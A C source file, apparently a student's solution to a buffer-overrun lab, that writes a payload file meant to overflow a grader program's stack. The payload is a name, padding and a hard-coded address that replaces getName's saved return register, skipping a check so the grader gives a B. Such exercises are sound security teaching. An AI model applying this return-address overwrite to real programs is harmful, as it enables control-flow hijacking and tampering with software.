/*--------------------------------------------------------------------*/
/* Produces a file called dataB with the student name, a nullbyte,    */
/* padding to overrun the stack, and the address of the instruction   */
/* in main to get a B, the latter of which will overwrite getName's   */
/* stored x30.                                                        */
/*                                                                    */
/* Authors: Maxwell Lloyd and Venus Dinari                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* Write the dataB file in order to overflow the stack with a way to    
   skip the if statement to guarantee a grade of b. Writes to the file "dataB" that grader takes as an input. Return 0   */
int main(void){
   FILE *psFile;
   unsigned long ulData;
   unsigned long pskipIf;
   int i;

   psFile = fopen("dataB", "w");
   
   /* Writes the student's names */
   ulData = 0x00006E655678614D;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);

   /* Writes the null byte at the end of the students names*/
   for (i = 0; i < 40; i++)
      putc(0x00, psFile); /* Writes '00000000' */

   /* Writes the new x30 for getName to skip the iff */
   pskipIf = 0x400890;
   fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);

   fclose(psFile);

   return 0;
}